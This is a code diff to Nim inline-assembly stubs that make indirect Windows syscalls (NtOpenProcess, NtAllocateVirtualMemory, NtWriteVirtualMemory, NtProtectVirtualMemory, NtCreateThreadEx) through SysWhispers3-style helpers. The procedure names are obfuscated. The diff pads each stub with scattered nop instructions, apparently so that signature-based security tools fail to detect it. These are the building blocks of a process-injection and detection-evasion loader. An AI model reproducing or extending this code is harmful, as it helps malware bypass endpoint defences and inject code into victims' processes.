@@ -358,21 +358,55 @@ EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
 #NtProtectVirtualMemory
 proc uashdiasdj*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx          
+	mov [rsp +8], rcx
+    nop
+    nop
+    nop
+    nop          
 	mov [rsp+16], rdx
 	mov [rsp+24], r8
-	mov [rsp+32], r9
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x005A90F1B
-	call SW3_GetRandomSyscallAddress        
+	nop
+    nop
+    mov ecx, 0x005A90F1B
+	nop
+    nop
+    call SW3_GetRandomSyscallAddress        
 	mov r15, rax                           
-	mov ecx, 0x005A90F1B
-	call SW3_GetSyscallNumber              
+	nop
+    nop
+    nop
+    nop
+    mov ecx, 0x005A90F1B
+	nop
+    nop
+    nop
+    nop
+    call SW3_GetSyscallNumber              
 	add rsp, 0x28
-	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov rcx, [rsp+8]                      
+	nop
+    nop
+    nop
+    nop
+    mov rdx, [rsp+16]
 	mov r8, [rsp+24]
-	mov r9, [rsp+32]
+	nop
+    nop
+    mov r9, [rsp+32]
 	mov r10, rcx
 	jmp r15                                
     """
@@ -381,19 +415,53 @@ proc oqiazasusjk*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, Numb
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
-	mov [rsp+24], r8
-	mov [rsp+32], r9
+	nop
+    nop
+    mov [rsp+24], r8
+	nop
+    nop
+    nop
+    nop
+    mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x0262FD121
-	call SW3_GetRandomSyscallAddress        
+	nop
+    nop
+    nop
+    nop
+    mov ecx, 0x0262FD121
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetRandomSyscallAddress        
 	mov r15, rax                           
-	mov ecx, 0x0262FD121
-	call SW3_GetSyscallNumber              
+	nop
+    nop
+    mov ecx, 0x0262FD121
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetSyscallNumber              
 	add rsp, 0x28
 	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
+	nop
+    nop
+    nop
+    nop
+    mov rdx, [rsp+16]
 	mov r8, [rsp+24]
-	mov r9, [rsp+32]
+	nop
+    nop
+    nop
+    nop
+    mov r9, [rsp+32]
 	mov r10, rcx
 	jmp r15                                
     """
@@ -401,21 +469,49 @@ proc oqiazasusjk*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, Numb
 proc zuq8aztsdztausdgbh*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
-	mov [rsp+16], rdx
+	nop
+    nop
+    nop
+    nop
+    mov [rsp+16], rdx
 	mov [rsp+24], r8
-	mov [rsp+32], r9
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov [rsp+32], r9
 	sub rsp, 0x28
 	mov ecx, 0x082B8C644
-	call SW3_GetRandomSyscallAddress        
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetRandomSyscallAddress        
 	mov r15, rax                           
-	mov ecx, 0x082B8C644
-	call SW3_GetSyscallNumber              
+	nop
+    nop
+    mov ecx, 0x082B8C644
+	nop
+    nop
+    call SW3_GetSyscallNumber              
 	add rsp, 0x28
-	mov rcx, [rsp+8]                      
+	nop
+    nop
+    mov rcx, [rsp+8]                      
 	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
+	nop
+    nop
+    mov r8, [rsp+24]
 	mov r9, [rsp+32]
-	mov r10, rcx
+	nop
+    nop
+    mov r10, rcx
 	jmp r15                                
     """
 #zuatzuastdiasyyose
@@ -423,19 +519,49 @@ proc zuatzuastdiasyy*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
-	mov [rsp+24], r8
+	nop
+    nop
+    mov [rsp+24], r8
 	mov [rsp+32], r9
-	sub rsp, 0x28
+	nop
+    nop
+    nop
+    nop
+    sub rsp, 0x28
 	mov ecx, 0x002A2130F
-	call SW3_GetRandomSyscallAddress        
-	mov r15, rax                           
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetRandomSyscallAddress        
+	nop
+    nop
+    mov r15, rax                           
 	mov ecx, 0x002A2130F
-	call SW3_GetSyscallNumber              
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetSyscallNumber              
 	add rsp, 0x28
-	mov rcx, [rsp+8]                      
+	nop
+    nop
+    nop
+    nop
+    mov rcx, [rsp+8]                      
 	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
-	mov r9, [rsp+32]
+	nop
+    nop
+    mov r8, [rsp+24]
+	nop
+    nop
+    mov r9, [rsp+32]
 	mov r10, rcx
 	jmp r15                                
     """
@@ -444,19 +570,47 @@ proc oqiahsjynmxkla*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG,
     asm """
 	mov [rsp +8], rcx          
 	mov [rsp+16], rdx
-	mov [rsp+24], r8
+	nop
+    nop
+    nop
+    nop
+    mov [rsp+24], r8
 	mov [rsp+32], r9
-	sub rsp, 0x28
+	nop
+    nop
+    sub rsp, 0x28
 	mov ecx, 0x0C89CFC21
-	call SW3_GetRandomSyscallAddress        
-	mov r15, rax                           
+	nop
+    nop
+    nop
+    nop
+    call SW3_GetRandomSyscallAddress        
+	nop
+    nop
+    nop
+    nop
+    mov r15, rax                           
 	mov ecx, 0x0C89CFC21
-	call SW3_GetSyscallNumber              
-	add rsp, 0x28
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetSyscallNumber              
+	nop
+    nop
+    nop
+    nop
+    add rsp, 0x28
 	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
+	nop
+    nop
+    mov rdx, [rsp+16]
 	mov r8, [rsp+24]
-	mov r9, [rsp+32]
+	nop
+    nop
+    mov r9, [rsp+32]
 	mov r10, rcx
 	jmp r15                                
     """
@@ -464,21 +618,57 @@ proc oqiahsjynmxkla*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG,
 proc opqiwepoausdasdjl*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
-	mov [rsp+16], rdx
+	nop
+    nop
+    nop
+    nop
+    mov [rsp+16], rdx
 	mov [rsp+24], r8
-	mov [rsp+32], r9
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov [rsp+32], r9
 	sub rsp, 0x28
+	nop
+    nop
+    nop
+    nop
+    mov ecx, 0x0C5BCDC30
+	nop
+    nop
+    call SW3_GetRandomSyscallAddress        
+	nop
+    nop
+    mov r15, rax                           
 	mov ecx, 0x0C5BCDC30
-	call SW3_GetRandomSyscallAddress        
-	mov r15, rax                           
-	mov ecx, 0x0C5BCDC30
-	call SW3_GetSyscallNumber              
-	add rsp, 0x28
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call SW3_GetSyscallNumber              
+	nop
+    nop
+    add rsp, 0x28
 	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
-	mov r9, [rsp+32]
-	mov r10, rcx
+	nop
+    nop
+    mov rdx, [rsp+16]
+	nop
+    nop
+    mov r8, [rsp+24]
+	nop
+    nop
+    mov r9, [rsp+32]
+	nop
+    nop
+    mov r10, rcx
 	jmp r15                                
     """
 
